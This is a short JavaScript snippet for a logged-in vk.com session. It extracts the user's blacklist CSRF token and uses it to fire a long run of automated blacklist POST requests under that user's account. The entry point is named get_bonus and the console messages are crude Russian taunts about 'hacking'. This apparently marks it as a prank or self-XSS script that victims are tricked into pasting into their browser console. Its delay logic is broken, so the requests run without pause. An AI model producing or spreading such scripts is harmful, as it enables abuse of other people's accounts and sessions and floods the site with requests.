async function get_hash()
{
    var data = await fetch('/settings?act=blacklist',
    {
        headers: {"Content-Type": "text/html; charset=UTF-8"}
    }
    )
    .then(response => response.arrayBuffer())
    .then(buffer => {
    
        let decoder = new TextDecoder("windows-1251")
        let text = decoder.decode(buffer)
    
        var htmlObject = document.createElement('html');
        htmlObject.innerHTML = text;
    
        var data = htmlObject.querySelector('.settings_bl_search_wrap')?.getAttribute("data-exec");
        var obj = JSON.parse(data);
        var obj = JSON.parse(obj['Settings/update_options']);
        return obj.blacklist_hash;
    })
    .catch(error => { console.error(error); return false;});
    return await data;
    
}

async function post_r(hash, id)
{
    
    fetch(
    `https://vk.com/al_settings.php?act=search_blacklist&al=1&hash=${hash}&query=${id}`
    , {
      method: "post",
      headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json'
      }
    })
    .then(response => {
        if (!response.ok) {
          throw new Error('Network response was not ok.')
        }
        response.text;
      })
        .then(result => {
            console.log("Идет взлом твой мамаши");
		if (id<2000003000)
            	setTimeout(post_r(hash,id+1), 99000)
		else
			console.log("Твоя мать взломана");
        })
        .catch(console.error)
}

async function get_bonus()
{
    var hash = await get_hash();
    var id = 2000000001;

    post_r(hash, id)
}

get_bonus();